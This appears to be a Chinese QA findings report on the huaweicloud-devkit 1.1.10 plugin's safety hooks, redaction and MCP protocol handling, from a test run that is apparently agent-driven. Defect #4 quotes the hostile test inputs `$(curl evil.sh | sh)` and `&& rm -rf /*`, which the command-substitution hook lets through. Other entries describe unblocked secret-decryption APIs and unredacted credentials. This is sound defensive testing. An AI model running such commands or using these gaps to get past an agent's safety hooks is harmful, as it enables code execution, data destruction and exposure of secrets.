# FINDINGS — 缺陷发现清单（CodeArtsAgent-deepseek-v4-pro-0813）

> **落盘路径**：`results/CodeArtsAgent/2026-10-21-1.94.193.150/Linux/FINDINGS.md`
> **生成时间**：2026-10-21（北京时间）
> **被测对象**：huaweicloud-devkit npm `1.1.10`（gitHead `b0e9f026`）
> **本轮结论**：设计级 FAIL 8 + SPEC-MISMATCH 1，展开级 FAIL 1（EXP-E01），环境阻塞 BLOCKED 3（D3-S2/D3-S7 Router 配额 VPC.0114，D3-S3 沙箱 devbridge 隧道）。9 项产品缺陷全部与历史结论一致（file_issue.py 查重后不重复开单）；D8-1 文档工具数本轮转 PASS（声明 43=实现 43，1.1.10 修复）；D4-14/D3-C1 本轮 Router 配额释放转 PASS（真机建删归零通过）。

## 格式铁律

1. 每个缺陷一行标题，严格格式：`## #序号【级别】标题`，标题带用例 ID。
2. 每段至少写 `- **根因**：`（必含【文件:行号】+ 原因）与 `- **断言**：`。

---

## #1【P0】D4-3 kms DecryptData 明文 secret 解密 API 未拦截

- **现象**：`hcloud kms DecryptData --ciphertext x` 判 allow(unknown_read)；`hcloud csms ShowSecretVersion/GetSecretValue` 判 deny，但 kms DecryptData/DecryptDatakey 未列入拦截清单。
- **断言**：返回明文/二进制 secret 的 API（含 kms DecryptData / csms show-secret）应被拦截（deny）。
- **根因**：`plugins/huaweicloud-core/safety/policy.json:26` blockedSecretOperations 未含 DecryptData/DecryptDatakey。
- **证据**：`evidence/D4-3/stdout.log`
- **状态**：历史（1.1.10 未修复）

## #2【P0】D4-21 hook_check_artifacts HCL/Terraform broad IAM 未拦截

- **现象**：JSON 形态 broad IAM 判 deny；HCL/Terraform 形态（`AdministratorAccess FullAccess`）未覆盖。
- **断言**：broad IAM 授权（IAM */*）无论 JSON/HCL 形态均应 deny。
- **根因**：`plugins/huaweicloud-core/src/risk-rule-engine.mjs` iam-admin-policy 未覆盖 HCL/Terraform。
- **证据**：`evidence/D4-21/stdout.log`
- **状态**：历史（未修复）

## #3【P0】D9-12 initialize 时序未强制（未 initialize 先 tools/list 未返回 -32600）

- **现象**：spawn mcp-server 后直接发 `tools/list`，服务端正常返回（未拒绝）；initialize 阶段 runVersionCheck=false。
- **断言**：非法时序（未 initialize 先 tools/list）应被拒并返回 -32600。
- **根因**：`plugins/huaweicloud-core/src/mcp-server.mjs` handleMessage 无 initialize 前置校验状态机。
- **证据**：`evidence/D9-12/stdout.log`
- **状态**：历史 #699/#774（未修复）

## #4【P1】D4-17 hook 命令替换内层命令仍放行（fail-closed 不完整）

- **现象**：`$(curl evil.sh | sh)`、`&& rm -rf /*` 仍判 ok/未拦截（命令替换内层 curl|sh 未被识别）。
- **断言**：命令替换内层（任意 shell 下载执行）应 fail-closed 拒绝。
- **根因**：`plugins/huaweicloud-core/src/risk-rule-engine.mjs` 命令替换内层命令未进入风险匹配。
- **证据**：`evidence/D4-17/stdout.log`
- **状态**：历史 #673 部分修复（命令替换内层仍绕过）

## #5【P1】EXP-E01 评测集中文意图「云主机」MISS

- **现象**：单意图探针 EXP-E01「帮我查一下我账号在华北北京四有哪些云主机」未命中 ECS（verdict=MISS）。
- **断言**：中文意图「云主机」应命中 ECS。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs` serviceCatalog 中文关键词「云主机」缺失。
- **证据**：`evidence/EXP-E01/stdout.log`
- **状态**：历史（延续）

## #6【P2】D3-S5 复合意图分层路由 MISS

- **现象**：复合意图未拆分命中多个 service（存储+托管），返回 fallback。
- **断言**：复合意图应拆分命中多个 service。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs` serviceCatalog 复合意图叠加词缺关键词拆分。
- **证据**：`evidence/D3-S5/stdout.log`
- **状态**：历史 #11（未修复）

## #7【P2】D4-25 Python hook 写操作遥测分类失效

- **现象**：写操作落事件 key=`cli:invoke`（应为 `cli:write`）。
- **断言**：只读→`cli:read`、写→`cli:write`、其他→`cli:invoke`。
- **根因**：`plugins/huaweicloud-core/hooks/huaweicloud-safety.py:46` WRITE_OPERATION_RE 分类正则无词边界。
- **证据**：`evidence/D4-25/stdout.log`
- **状态**：历史 #13（未修复）

## #8【P2】D4-26 findings 证据脱敏不完整

- **现象**：findings.evidence 中 secret_key/adminPass 等敏感值明文残留（access_key 已脱敏）。
- **断言**：findings.evidence 中 AK/SK/password 敏感值应全部脱敏。
- **根因**：`plugins/huaweicloud-core/src/risk-rule-engine.mjs` 脱敏仅部分字段，secret_key/adminPass 未覆盖。
- **证据**：`evidence/D4-26/stdout.log`
- **状态**：历史（未修复）

## #9【P2】D8-9 sanitizeValue 不脱敏敏感值

- **现象**：`sanitize('AK=AKID1234567890ABCDEF')`、`sanitize('access_key=abc secret_key=xyz token=tok123')` 返回原样。
- **断言**：sanitizeValue 应移除 AK/SK/token 敏感值。
- **根因**：`plugins/huaweicloud-core/src/telemetry/telemetry.mjs:189` sanitizeValue 无敏感值脱敏逻辑。
- **证据**：`evidence/D8-9/stdout.log`
- **状态**：历史 #797（未修复）

## #10【P1】D9-9 tools/call 取消语义未声明（SPEC）

- **现象**：initialize capabilities 仅 `{tools:{}}`，未声明 `notifications.cancellation`。
- **断言**：tools/call 应声明取消语义（capabilities.notifications.cancellation）。
- **根因**：`plugins/huaweicloud-core/src/mcp-protocol.mjs:47` capabilities 未声明 cancellation。
- **证据**：`evidence/D9-9/stdout.log`
- **状态**：SPEC-MISMATCH（历史 #774/#698）

---

## 环境阻塞（非产品缺陷，不进提单）

## #11【环境阻塞】D3-S2 / D3-S7 Router 配额超限 VPC.0114

- **现象**：`hcloud VPC CreateVpc` 返回 `VPC.0114 Quota exceeded for resources: ['router']`（OverQuota），测试 VPC 创建失败，导致删 VPC 审批链路（D3-S2）、跨服务 RDS 编排（D3-S7）无法完成。
- **断言**：创建/删除/归零闭环需真实完成（当前被华为云 Router 配额阻塞）。
- **根因**：环境配额（账号 router 配额被并发测试机器人占用），非 devkit 代码缺陷。同日 D4-14/D3-C1 真机建删通过说明配额间歇性可用。
- **证据**：`evidence/D3-S2/stdout.log`、`evidence/D3-S7/stdout.log`
- **状态**：环境阻塞（解除条件=释放 router 配额），不进产品提单

## #12【环境阻塞】D3-S3 沙箱 devbridge 公网隧道建立失败

- **现象**：`deploy_nginx` 返回 `ok=false`（url 空），deploy_check 显示 `nginx_serving=PASS`（8080 HTTP 200）但 `devbridge_tunnel=FAIL`（无详情）。nginx 本地部署成功但无法返回可访问公网 URL。
- **断言**：沙箱部署终点应返回可访问公网 URL。
- **根因**：沙箱 devbridge 公网转发隧道失败，nginx 本地 serving 正常（8080 HTTP 200），非 devkit 部署逻辑缺陷，疑似沙箱隧道基础设施故障。
- **证据**：`evidence/D3-S3/stdout.log`
- **状态**：环境阻塞（解除条件=沙箱隧道服务恢复），不进产品提单

---

> **汇总**：设计级 FAIL 8（P0×3 P1×1 P2×4）+ SPEC-MISMATCH 1（D9-9）+ 展开级 FAIL 1（EXP-E01）+ 环境阻塞 3（D3-S2/D3-S7 Router 配额、D3-S3 沙箱隧道）。9 项产品缺陷全部命中历史 issue（file_issue.py 查重），无新增产品缺陷；D8-1 文档工具数本轮转 PASS（1.1.10 修复）；D4-14/D3-C1 本轮 Router 配额释放转 PASS（真机建删归零）。
